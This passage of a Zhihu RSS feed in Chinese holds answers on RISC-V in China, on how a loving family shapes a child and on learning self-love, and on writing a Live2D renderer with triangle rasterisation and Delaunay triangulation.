空间。如今，RISC-V已在中国蓬勃发展，中国也在RISC-V生态中贡献越来越多的力量——首届RISC-V中国峰会就是最好的写照。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/bao-yun-gang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">包云岗</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/466393646/answer/1955410750?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">14 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/329960518?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">Intel公司在中国有芯片设计岗位吗？</a><br><a href=\"http://www.zhihu.com/question/278280318?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">有了解广州粤芯半导体技术有限公司的吗？</a><br>\n","link":"http://www.zhihu.com/question/466393646/answer/1955410750?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"充满爱的家庭能给孩子带来什么？这些能否通过后天获得？","date":"2021-06-22 23:00:10","description":"\n<p>一个有爱的家庭，就像一片丰富的土壤，能给一个人的成长提供持续且足够的滋养与力量。</p>\n<p>如果没有一个有爱的家庭，就需要成年的自己，主动获得爱的滋养，为其注入营养。</p>\n<p><br></p>\n<p>根据美国儿童研究组织Child Trends的说法，一方面，父母对孩子的温暖与爱会带来更高的自尊、更好的学习成绩、更好的亲子沟通以及更少的心理和行为问题。另一方面，没有慈爱父母的<b>孩子往往自尊心较低，感觉更加疏远、敌意、好斗和反社会。</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-f904f83415be2c9ff487510f28be5995_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"854\" data-rawheight=\"1280\" data-watermark=\"original\" data-original-src=\"v2-f904f83415be2c9ff487510f28be5995\" data-watermark-src=\"v2-32289d6b6164d74dd6d441f762bfc86d\" data-private-watermark-src=\"v2-d405c66da1cb77eb3fcb6a4827471bf3\"></p>\n<p>下面我们来看一看相关研究。</p>\n<p><b>研究一：爱有助于孩子发展出稳定的情绪</b></p>\n<p>2010 年，杜克大学医学院的研究人员发现，拥有非常深情和细心的母亲的婴儿长大后会变得<b>更快乐、更有弹性、焦虑更少。[1]</b></p>\n<p>该研究涉及大约 500 人，他们从婴儿时期一直到 30 多岁。</p>\n<p>当婴儿八个月大时，心理学家观察了他们的母亲在他们进行了几次发育测试时与他们的互动。</p>\n<p>心理学家从“消极”到“饱满的爱”等五个程度对母亲的感情和关注程度进行了评估。近 10% 的母亲表现出低度的感情，85% 的母亲表现出正常的感情，约 6% 的母亲表现出高度的感情。</p>\n<p>30 年后，这些人接受了情绪健康的采访。</p>\n<p><b>母亲表现出“饱满的爱”或“爱抚”感情的成年人比其他人更不容易感到压力和焦虑。他们也不太可能报告敌意、令人痛苦的社交互动和心身症状。</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-7e849fc3a02a4a35600e701ac0eb0201_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"853\" data-watermark=\"original\" data-original-src=\"v2-7e849fc3a02a4a35600e701ac0eb0201\" data-watermark-src=\"v2-da113f3a27b18042c5ab03b71d30f2bd\" data-private-watermark-src=\"v2-80da340cec6e711e7d83e25f761d0290\"></p>\n<p><b>研究二：爱有助于孩子的大脑发育</b></p>\n<p>大脑发育最重要的阶段是生命的开始，从子宫开始，然后是生命的第一年。到三岁时，儿童的大脑已达到其成人大小的近 90%。在此期间，这种快速的大脑生长和回路估计以每秒 700-1000 个突触连接的惊人速度发生。[2][3]</p>\n<p>婴儿与照顾者的经历对于这种早期脑回路的布线和修剪至关重要，并且良好的互动能够帮助婴儿在大脑中建立数以百万计的新突触连接。</p>\n<p><b>父母与孩子反复的互动和交流，会有助于提升孩子的记忆、建立关系的能力，同时能促进其逻辑发展。[4]</b></p>\n<p><br></p>\n<p><b>研究三：爱有助于孩子建立良好的依恋模式与关系</b></p>\n<p>在与人类接触极少的幸存“野蛮”儿童的悲惨案例研究表明，在缺乏爱、语言沟通的抚养的条件下，孩子的语言能力和情感发展能力会严重缺乏。</p>\n<p>另一项纵向研究报告称，对主要照顾者的不安全依恋可能会<b>显著削弱儿童在一生中形成和维持健康关系的能力。 [5]</b></p>\n<p>同时Teicher  报道了在早年遭受忽视（一种极端的不安全依恋形式）的儿童的以下病理状况[6]</p>\n<ul>\n<li> 左半球生长减慢，这可能会导致相关的抑郁症风险增加。</li>\n<li> 边缘​​系统的敏感性增加，这可能导致焦虑症。</li>\n<li> 可能导致学习和记忆障碍的海马体生长减少。</li>\n</ul>\n<p><img src=\"https://pic1.zhimg.com/v2-cf9e86f17b227b7a4b74af4e5159f9d4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"772\" data-watermark=\"original\" data-original-src=\"v2-cf9e86f17b227b7a4b74af4e5159f9d4\" data-watermark-src=\"v2-985cb8af8b9554ab842e5f31019e0609\" data-private-watermark-src=\"v2-a9fd5600a380ce7f0cbaffd8fe9d82b4\"></p>\n<p>通过以上列举的研究，我们不难发现一个人的情绪、建立关系的能力、安全感、患某些疾病的风险，都与童年时家庭是否有充足的爱有关。那是否如果我们没有成长在一个有爱的原生家庭里，我们后天就无法再改变了呢？</p>\n<p><br></p>\n<p>Margaret Paul 博士认为，以下的5步可以帮你学会爱自己，重建滋养出爱的土壤。[7]</p>\n<p><br></p>\n<p><b>第 1 步：愿意感受痛苦并对自己的感受负责。</b></p>\n<p>有意识地跟随你的呼吸，进入你的身体并拥抱你的所有感受。勇敢地体会你的感觉，例如，腹部有痉挛感、胸口闷时，体会这种身体感觉。不要试图用各种方法逃避感受，例如专注于你的头脑、评判自己、转向上瘾及麻木等。</p>\n<p><br></p>\n<p><b>第 2 步：了解你的情绪</b></p>\n<p>所有的感觉都是信息性的，提醒着你曾经发生了什么，有哪些创伤和问题还没有处理。</p>\n<p>致力于了解你的情绪，即使是那些可能让你痛苦的情绪，这样你才能开始采取爱的行动。</p>\n<p>试着为这些情绪命名、比如“焦虑”、“沮丧”、“愤怒”、“失望”，并细心了解它们什么时候出现、为什么出现、出现的形式与感觉等等。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-5a6175e01708da6c1d82b59b1531df67_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"894\" data-watermark=\"original\" data-original-src=\"v2-5a6175e01708da6c1d82b59b1531df67\" data-watermark-src=\"v2-f4e36785f4559a343c8204021d3bb683\" data-private-watermark-src=\"v2-3604c464e20fcb98df0f3d98c2426611\"></p>\n<p><b>第 3 步：了解您的错误信念。</b></p>\n<p>第 3 步是一个深入而富有同情心的探索过程——了解你的信念和行为，以及可能导致你痛苦的人或情况是发生了什么。</p>\n<p>问问内在的感觉（内在感觉可能会以小男孩或小女孩的形象呈现）：“是什么导致了焦虑、抑郁、内疚、羞耻、嫉妒、愤怒、孤独或空虚的痛苦感觉？” 让答案来自内心，来自你的直觉和感受。</p>\n<p>一旦你了解了导致这些感觉的事件、想法、行为，问问你的自我关于导致自我放弃的想法和行为的恐惧和错误信念。</p>\n<p><br></p>\n<p><b>第4步：采取爱的行动</b></p>\n<p>有时人们认为“爱自己”是一种被召唤出来的感觉。看待爱自己的一个好方法是强调行动：<b>“我能做些什么来爱自己？</b>” ，而不是“我怎么能感受到对自己的爱？”</p>\n<p>比如，你觉得请自己吃大餐是爱自己，就去吃大餐，你觉得让伴侣给自己个拥抱是爱自己，就请求伴侣的拥抱。</p>\n<p>总之，落实到具体的行动上来爱自己。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-653c7ae6d9d90132e7733610395facfd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-653c7ae6d9d90132e7733610395facfd\" data-watermark-src=\"v2-a46001abf950678fd3e445b7047ff06c\" data-private-watermark-src=\"v2-b59ae966176d8f8275b6541a98101575\"></p>\n<p><b>第 5 步：评估您的行动并根据需要重新开始</b></p>\n<p>一旦你采取了爱的行动，检查一下你的痛苦、愤怒和羞耻是否得到了治愈。如果没有，你就会回到这些步骤，直到你发现真相和爱的行为，这些行为会给你带来平静、快乐和深刻的内在价值感。</p>\n<p>随着时间的推移，你会发现爱自己会改善你生活中的一切——你的人际关系、你的健康和幸福、你实现梦想的能力以及你的自尊。。</p>\n<p>爱自己并与自己建立联系是能够爱他人并与他人建立联系并建立爱的关系的关键。爱自己是创造热情、充实和快乐生活的关键。</p>\n<p><br></p>\n<p>爱与被爱对于每个孩子、每个成年人来说，都是至关重要的事情。</p>\n<p>我想请你相信一件非常重要的事情：<b>小时候的爱或许并不充足，但这并不意味着爱不存在，也不意味着长大后的我们不能去获取爱、学习爱。</b></p>\n<p>我很喜欢仓央嘉措的几句诗：你爱，或者不爱我，爱就在那里，不增不减。</p>\n<p>爱是一种能力，只要你想要去学习，就一定能学会、能获得。</p>\n<p><br></p>\n<p>关注 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/dee99bcf9da2172a7de2ce90a5f64542\" data-hash=\"dee99bcf9da2172a7de2ce90a5f64542\" data-hovercard=\"p$b$dee99bcf9da2172a7de2ce90a5f64542\">@壹心理</a> ，我们用专业的心理学知识、人性的爱与温度，陪伴你的心灵成长</p>\n<p>世界和我爱着你~</p>\n<p><br></p>\n<blockquote>参考资料：<br>[1]<a href=\"http://link.zhihu.com/?target=https%3A//www.mother.ly/child/how-a-parents-affection-shapes-a-childs-happiness-for-life\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://www.</span><span class=\"visible\">mother.ly/child/how-a-p</span><span class=\"invisible\">arents-affection-shapes-a-childs-happiness-for-life</span><span class=\"ellipsis\"></span></a><br>[2]Perry BD. Traumatized children: how childhood trauma influences brain development. <i>J. California Alliance Mentally Ill. </i>2000;11:48–51<br>[3]Rethinking evidence-based practice and two-generation programs to create the future of early childhood policy.<br>[4]Shore R. <i>Rethinking the brain.</i> New York, NY: Families and Work Institute; 1997.<br>[5]Perry BD. Vol. 3. Brain and mind; 2002. Childhood experience and the expression of genetic potential: what childhood neglect tells us about nature and nurture; pp. 79–100.<br>[6]Teicher MD. Wounds that time won’t heal: the neurobiology of child abuse. <i>Cerebrum: The Dana Forum on brain science. </i>2000;2:50–67<br>[7]<a href=\"http://link.zhihu.com/?target=https%3A//www.mindbodygreen.com/0-15295/how-do-you-actually-learn-to-love-yourself.html\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://www.</span><span class=\"visible\">mindbodygreen.com/0-152</span><span class=\"invisible\">95/how-do-you-actually-learn-to-love-yourself.html</span><span class=\"ellipsis\"></span></a>\n</blockquote>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yi-xin-li-1?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">壹心理</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/465547566/answer/1954604848?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">99 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/318331653?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">家庭对于孩子来说影响多大，又如何能够自我救赎？</a><br><a href=\"http://www.zhihu.com/question/451806172?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么现在的家庭已经不再是很多人的避风港呢？</a><br>\n","link":"http://www.zhihu.com/question/465547566/answer/1954604848?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"想问一下制作live 2D困难吗？","date":"2021-06-22 11:30:10","description":"\n<p>第一次看到live2D估计是群里看到的,第一次看的感觉就是这个动画看起来很奇怪,有点粗糙,搞不懂这种动画怎么都能火,不过看了一段时间以后,简直是越看越顺眼,在今年1月份的时候,萌生了自己也来做一个live2D的想法,没错,你没看错,这里指的是制作live2D,不是制作live2D模型</p>\n<p>这里的制作live2D指的是,实现live2D的基础动画功能,完整实现其骨骼,动作追踪,网格建立,物理模拟到图元光栅化操作.</p>\n<p>其实说困难吧,也不太困难,说不困难吧,算算也将近花了5个月时间来做.</p>\n<p>这么一听瞬间高大上了是不是.</p>\n<p>为了方便调试,我预先绘制了一个调试用的人设,这部分用sai就可以了</p>\n<p>1.打个线稿</p>\n<p><img src=\"https://pic1.zhimg.com/v2-ed24c3b2382cfcfb3dd254bf5fa5c347_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1127\" data-rawheight=\"803\" data-watermark=\"watermark\" data-original-src=\"v2-ed24c3b2382cfcfb3dd254bf5fa5c347\" data-watermark-src=\"v2-eac05329ec218cca187fe7eaa52c56dc\" data-private-watermark-src=\"v2-004b1a8e8046eb2ded9fa13b61d3d8cc\"></p>\n<p>2.调整一下,上个涩</p>\n<p><img src=\"https://pic2.zhimg.com/v2-c25cd7aa4f23b229a1afdf5b68c43717_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1122\" data-rawheight=\"802\" data-watermark=\"watermark\" data-original-src=\"v2-c25cd7aa4f23b229a1afdf5b68c43717\" data-watermark-src=\"v2-3e54766af5d9120fb5fe5b55896d0b04\" data-private-watermark-src=\"v2-ea45c68906fbd8bd30419afa3dbcd688\"></p>\n<p>3.最麻烦的一步,将每一个图层,导出为独立的png图片</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d251868b120821f2aa47c04cc554794f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1032\" data-rawheight=\"549\" data-watermark=\"watermark\" data-original-src=\"v2-d251868b120821f2aa47c04cc554794f\" data-watermark-src=\"v2-06937a6572a097a0f9b1e4a3f1ed2a50\" data-private-watermark-src=\"v2-af197acbb972dc2007c0524f8f007d1d\"></p>\n<p>准备工作完成,启动Visual Studio</p>\n<p><img src=\"https://pic4.zhimg.com/v2-278600e15f2597b8b94a72675bd08ac7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"520\" data-rawheight=\"263\" data-watermark=\"watermark\" data-original-src=\"v2-278600e15f2597b8b94a72675bd08ac7\" data-watermark-src=\"v2-4fcffb1fecdb5ef2bd29caca2f3a361c\" data-private-watermark-src=\"v2-6e740595a979273423d7dc99203845f7\"></p>\n<p>现在,我们可以开始来愉快的做live2D了</p>\n<p>为此,我们先请出我们可爱的大学本科期间的一本基础教材&lt;&lt;计算机图形学&gt;&gt;来开始我们Live2D的基础原理说明</p>\n<p><img src=\"https://pic3.zhimg.com/v2-56e7337051f3e339414855d1a6112aad_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"402\" data-rawheight=\"446\" data-watermark=\"watermark\" data-original-src=\"v2-56e7337051f3e339414855d1a6112aad\" data-watermark-src=\"v2-ba4fe8a5db683031badadb6c190a68d0\" data-private-watermark-src=\"v2-1f7abad767d8e0180ae341752fc2c02d\"></p>\n<p>我们先来复习一下图形学的基础</p>\n<p>首先,我们先对图元做个定义</p>\n<ol>\n<li>live2D的所有图形由图元分割</li>\n<li>每个图元,由三个不共线的顶点构成,为一个三角形</li>\n<li>每个顶点包含x,y坐标,每个由一个float32存储</li>\n<li>每个顶点包含u,v纹理坐标,每个坐标范围为0-1.0f,超出范围的坐标视为无效映射坐标,每个由一个float32存储.</li>\n<li>每个顶点包含一个法向量,表示该顶点所处图元的法向量,法向量由一个x,y,z组成,每个由一个float32存储</li>\n</ol>\n<p>上面是图形学渲染中一个非常常用的结构,因为在渲染的过程中,live2D的模型不需要额外的投影变换矩阵进行顶点隐射(或者说使用了仿射变换),也不需要额外的ZBuffer来维护每个顶点的深度(因为我直接使用图层的方式对每个live2D图像进行管理,因此我直接使用画家算法对图层进行先后绘制即可),因此,我们可以将重点放在图元如何进行渲染中来.</p>\n<p>幸好这也并不是什么很复杂的事情,我们直接使用扫描线填充算法来填充图元就可以了</p>\n<p><img src=\"https://pic1.zhimg.com/v2-12022448a2d9c65c08a5079cdb8290b7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"316\" data-rawheight=\"205\" data-watermark=\"watermark\" data-original-src=\"v2-12022448a2d9c65c08a5079cdb8290b7\" data-watermark-src=\"v2-4022ac8df72fc20ad66491d5b6064dbd\" data-private-watermark-src=\"v2-3acc774c68f73eaca1d0a06192fa8144\"></p>\n<p>对应伪代码如下</p>\n<p>1.首先我们先计算扫描线的y坐标,设 <img src=\"https://www.zhihu.com/equation?tex=y%5E%7B%27%7D\" alt=\"y^{'}\" eeimg=\"1\"> 是一个整数,那么 <img src=\"https://www.zhihu.com/equation?tex=y%3Dy%5E%7B%27%7D%2B0.5\" alt=\"y=y^{'}+0.5\" eeimg=\"1\"></p>\n<p>2.计算直线 <img src=\"https://www.zhihu.com/equation?tex=y%3Dn_i\" alt=\"y=n_i\" eeimg=\"1\"> 与图元三角形左右交点</p>\n<p>3.从左交点开始,逐一计算其映射的 <img src=\"https://www.zhihu.com/equation?tex=%28u%2Cv%29\" alt=\"(u,v)\" eeimg=\"1\"> 坐标,并用该坐标映射到纹理中的像素,绘制扫描线</p>\n<p>因此,当我们加载一个图形到live2D的项目中,其最终会依据一个2D图元的方式将图像最终显示出来</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2d79ee82a3c26f7e1ec27f29d139915a_720w.jpg?rss\" data-caption=\"纹理贴图(未绑定图元以前)\" data-size=\"normal\" data-rawwidth=\"761\" data-rawheight=\"434\" data-watermark=\"watermark\" data-original-src=\"v2-2d79ee82a3c26f7e1ec27f29d139915a\" data-watermark-src=\"v2-c7eae9a6a3780bdec179946599748ee0\" data-private-watermark-src=\"v2-c5d48032df9780bf8fc387f41a3bf509\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-6d1e541cd90d9d92e605b2312f54a41a_720w.jpg?rss\" data-caption=\"绑定了图元后\" data-size=\"normal\" data-rawwidth=\"756\" data-rawheight=\"391\" data-watermark=\"watermark\" data-original-src=\"v2-6d1e541cd90d9d92e605b2312f54a41a\" data-watermark-src=\"v2-c19defbde1e94299b9e446b07a145770\" data-private-watermark-src=\"v2-fc5e344f0213547353dad9bfdebb220a\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-0ae967c8c231df297ffc5973311ad94b_720w.jpg?rss\" data-caption=\"由2个图元来完整组成该图形\" data-size=\"normal\" data-rawwidth=\"760\" data-rawheight=\"399\" data-watermark=\"watermark\" data-original-src=\"v2-0ae967c8c231df297ffc5973311ad94b\" data-watermark-src=\"v2-e224798681f945b76cc7f2fcf887a164\" data-private-watermark-src=\"v2-af94dc3061ac4da208ce8870d51ea988\"></p>\n<p>需要值得一提的是,为了进一步提高图元的渲染质量,在进行u,v纹理坐标隐射之前,笔者使用了双线性插值滤波,对纹理映射关系进一步处理</p>\n<p><img src=\"https://pic1.zhimg.com/v2-39e00a24e9186ac03295f583d2ab88a1_720w.jpg?rss\" data-caption=\"未使用插值滤波\" data-size=\"normal\" data-rawwidth=\"409\" data-rawheight=\"372\" data-watermark=\"watermark\" data-original-src=\"v2-39e00a24e9186ac03295f583d2ab88a1\" data-watermark-src=\"v2-038ff414fd4c95d17f9a64d20695c120\" data-private-watermark-src=\"v2-f9cedc3af49e2d85a812ffbb81bf74e8\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-440735723198cae98f939fd8e3c36d04_720w.jpg?rss\" data-caption=\"使用了插值滤波\" data-size=\"normal\" data-rawwidth=\"378\" data-rawheight=\"349\" data-watermark=\"watermark\" data-original-src=\"v2-440735723198cae98f939fd8e3c36d04\" data-watermark-src=\"v2-8879bef879373d9a3fbe84ba5b9c7fee\" data-private-watermark-src=\"v2-bf7e9a0a753d89f6d750c9a0f3e29487\"></p>\n<p>图元(三角形)的填充算法,在Live2D的渲染过程中,图元填充(纹理映射)是整个live2D项目的基石,在完成这一个关键步骤之后,所有的变换,都可以通过一些列的平移,旋转,缩放矩阵的级联并最终应用于顶点变换来完成.</p>\n<p><img src=\"https://pic1.zhimg.com/v2-0b1901ed42f97460e8d2fed8853e45fb_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"322\" data-rawheight=\"388\" data-watermark=\"watermark\" data-original-src=\"v2-0b1901ed42f97460e8d2fed8853e45fb\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>到了这一步,我们将之前绘制好的所有图层加载进来,并准备为每一个图层设定网格(mesh)</p>\n<p><img src=\"https://pic4.zhimg.com/v2-f5965026ede29f9997c2859bf16da37f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"450\" data-watermark=\"watermark\" data-original-src=\"v2-f5965026ede29f9997c2859bf16da37f\" data-watermark-src=\"v2-1ae21954f6a9cdaa7082adb8fe88b0d7\" data-private-watermark-src=\"v2-a250ab4b344e091956b49e8e39ff26c3\"></p>\n<p>到此,除了为每一个图层设定一个z坐标外,首当其冲要解决的是网格建立的问题,为此,不得不聊一聊著名的Delaunary三角剖分</p>\n<p>先来看看定义部分(来自百度百科)</p>\n<p>【定义】三角剖分：假设 <img src=\"https://www.zhihu.com/equation?tex=V\" alt=\"V\" eeimg=\"1\"> 是二维实数域上的有限点集，边 <img src=\"https://www.zhihu.com/equation?tex=e\" alt=\"e\" eeimg=\"1\"> 是由点集中的点作为端点构成的封闭线段， <img src=\"https://www.zhihu.com/equation?tex=E\" alt=\"E\" eeimg=\"1\"> 为 <img src=\"https://www.zhihu.com/equation?tex=e\" alt=\"e\" eeimg=\"1\"> 的集合。那么该点集 <img src=\"https://www.zhihu.com/equation?tex=V\" alt=\"V\" eeimg=\"1\"> 的一个三角剖分 <img src=\"https://www.zhihu.com/equation?tex=T%3D%28V%2CE%29\" alt=\"T=(V,E)\" eeimg=\"1\"> 是一个平面图 <img src=\"https://www.zhihu.com/equation?tex=G\" alt=\"G\" eeimg=\"1\"> ,该平面图满足条件：</p>\n<p>1、除了端点，平面图中的边不包含点集中的任何点。</p>\n<p>2、没有相交边。（边和边没有交叉点）</p>\n<p>3、平面图中所有的面都是三角面，且所有三角面的合集是散点集V的凸包。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-482a248ac38cc7bb046b6ca9e520ba01_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"366\" data-rawheight=\"138\" data-watermark=\"watermark\" data-original-src=\"v2-482a248ac38cc7bb046b6ca9e520ba01\" data-watermark-src=\"v2-0479a64e9f50a13e67fd39980f3b8c02\" data-private-watermark-src=\"v2-d16e7753a96bb718b9ad002524097bb0\"></p>\n<p>要满足Delaunay三角剖分的定义，必须符合两个重要的准则：</p>\n<p>1、空圆特性：Delaunay三角网是唯一的（任意四点不能共圆），在Delaunay三角形网中任一三角形的外接圆范围内不会有其它点存在。如下图所示：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-372e0200ce1f8e241e18b208d33ade02_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"267\" data-rawheight=\"289\" data-watermark=\"watermark\" data-original-src=\"v2-372e0200ce1f8e241e18b208d33ade02\" data-watermark-src=\"v2-5278ed48f83d0835542e7cb3cff17bd2\" data-private-watermark-src=\"v2-a089eefb7e9152162d377203bb383625\"></p>\n<p>2、最大化最小角特性：在散点集可能形成的三角剖分中，Delaunay三角剖分所形成的三角形的最小角最大。从这个意义上讲，Delaunay三角网是“最接近于规则化的“的三角网。具体的说是指在两个相邻的三角形构成凸四边形的对角线，在相互交换后，六个内角的最小角不再增大。如下图所示：</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-899f882b9c11ed742e8fb2341083b1e0_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"386\" data-rawheight=\"153\" data-watermark=\"watermark\" data-original-src=\"v2-899f882b9c11ed742e8fb2341083b1e0\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>以下是Delaunay剖分所具备的优异特性：</p>\n<p>1.最接近：以最近的三点形成三角形，且各线段(三角形的边)皆不相交。</p>\n<p>2.唯一性：不论从区域何处开始构建，最终都将得到一致的结果。</p>\n<p>3.最优性：任意两个相邻三角形形成的凸四边形的对角线如果可以互换的话，那么两个三角形六个内角中最小的角度不会变大。</p>\n<p>4.最规则：如果将三角网中的每个三角形的最小角进行升序排列，则Delaunay三角网的排列得到的数值最大。</p>\n<p>5.区域性：新增、删除、移动某一个顶点时只会影响临近的三角形。</p>\n<p>6.具有凸四边形的外壳：三角网最外层的边界形成一个凸多边形的外壳。</p>\n<p>在Delaunay三角建立算法中,最著名的有<i><b>Lawson</b>及</i><b><i>Bowyer-Watson</i>算法</b>,但lawson算法不论是速度还是实际应用的实用度都不如后者,因此在Live2D中笔者使用了后者作为三角剖分算法</p>\n<p>其伪代码如下</p>\n<ol>\n<li>构造一个超级三角形，包含所有散点，放入三角形链表。</li>\n<li>将点集中的散点依次插入，在三角形链表中找出外接圆包含插入点的三角形（称为该点的影响三角形），删除影响三角形的公共边，将插入点同影响三角形的全部顶点连接起来，完成一个点在Delaunay三角形链表中的插入。</li>\n<li>根据优化准则对局部新形成的三角形优化。将形成的三角形放入Delaunay三角形链表。</li>\n<li>循环执行上述第2步，直到所有散点插入完毕。</li>\n<li>剔除与超级三角顶点有关的三角形</li>\n</ol>\n<p>但上述的伪代码是存在问题的,这个问题发生在后面加上的第五步,这可能导致剔除后产生一个非完整的凸包</p>\n<p><img src=\"https://pic4.zhimg.com/v2-6e4a8a563428ebbc5318dd72e84d4d70_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"347\" data-rawheight=\"321\" data-watermark=\"watermark\" data-original-src=\"v2-6e4a8a563428ebbc5318dd72e84d4d70\" data-watermark-src=\"v2-a6309069e09830ba78480b0935c1a8a7\" data-private-watermark-src=\"v2-01d8d534883e506bf7a27e9d8f451a69\"></p>\n<p>因此,在第五步剔除三角形之后,应该预先每一个有关顶点,在进行一次判断,以让其满足夹角为锐角的条件,以生成一个完整的凸包</p>\n<p>之后,我们需要依据外围顶点的封闭区域,剔除掉封闭区域之外的三角形,最后建立网格</p>\n<p><img src=\"https://pic1.zhimg.com/v2-42ba0f2fe2fe70adcd03d981d8867818_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"184\" data-rawheight=\"184\" data-watermark=\"watermark\" data-original-src=\"v2-42ba0f2fe2fe70adcd03d981d8867818\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>不管如何,当我们最终完成了三角剖分算法后,我们就可以着手将模型加载进来,正如你所见,每一个实际图层都绑定着一套网格</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d938249e9506272c28bfc60bd46bcc4c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"384\" data-rawheight=\"418\" data-watermark=\"watermark\" data-original-src=\"v2-d938249e9506272c28bfc60bd46bcc4c\" data-watermark-src=\"v2-f55b91638048ad928757521879e0c6fe\" data-private-watermark-src=\"v2-60b87289bce9b2463c3185c8b4765d9f\"></p>\n<p>实际上整个live2D模型,也正是基于顶点变换的基础之上的</p>\n<p><img src=\"https://pic1.zhimg.com/v2-30323075beac3eedc7355a56c6a43745_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"437\" data-rawheight=\"426\" data-watermark=\"watermark\" data-original-src=\"v2-30323075beac3eedc7355a56c6a43745\" data-watermark-src=\"v2-81b252cd77353235805eb84c9eaf2b88\" data-private-watermark-src=\"v2-13f0de00bf13ddc7abd05958b58b50c4\"></p>\n<p>而基于这点,我们不入Live2D的下一个话题,骨骼动画,如果我们摸摸自己的身体,很容易总结出一个道理,在人体中的大部分骨骼,由一个关节节点连接到另一个关节节点上,而基于这点的拓展,我们同样可以为每一个图层设置一个关键的节点</p>\n<p><img src=\"https://pic3.zhimg.com/v2-5a5245c124c21b48ca2efe01cded3e98_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"384\" data-rawheight=\"397\" data-watermark=\"watermark\" data-original-src=\"v2-5a5245c124c21b48ca2efe01cded3e98\" data-watermark-src=\"v2-89a885e093837d72ec75e896e9c45edf\" data-private-watermark-src=\"v2-5480571dff79360f27c2039114d8d34f\"></p>\n<p>为了简化说明下这个流程,笔者创建了一个三个图层组成的样例,每个图层由一条粗线组成</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f9c13842497a7e78b5705c6f9a245b44_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"466\" data-rawheight=\"417\" data-watermark=\"watermark\" data-original-src=\"v2-f9c13842497a7e78b5705c6f9a245b44\" 